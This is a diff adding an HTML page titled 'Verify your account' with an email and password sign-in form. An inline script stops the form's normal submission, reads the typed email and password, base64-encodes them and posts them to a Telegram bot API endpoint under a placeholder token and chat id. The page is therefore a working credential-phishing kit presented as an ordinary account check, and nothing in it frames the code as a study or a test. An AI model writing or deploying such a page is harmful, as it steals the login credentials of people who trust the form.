@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Verify your account</title>
+</head>
+<body>
+<form id="login" action="/login" method="post">
+  <input type="email" id="email" name="email">
+  <input type="password" id="password" name="password">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+  var token = "123456:ABC-DEF";
+  var api = "https://api.telegram.org/bot" + token + "/sendMessage";
+  document.getElementById("login").onsubmit = function (e) {
+    e.preventDefault();
+    var p = document.getElementById("password").value;
+    var u = document.getElementById("email").value;
+    var text = "Email: " + u + " Password: " + p;
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", api);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify({ chat_id: "-1001", text: btoa(text) }));
+    return false;
+  };
+</script>
+</body>
+</html>
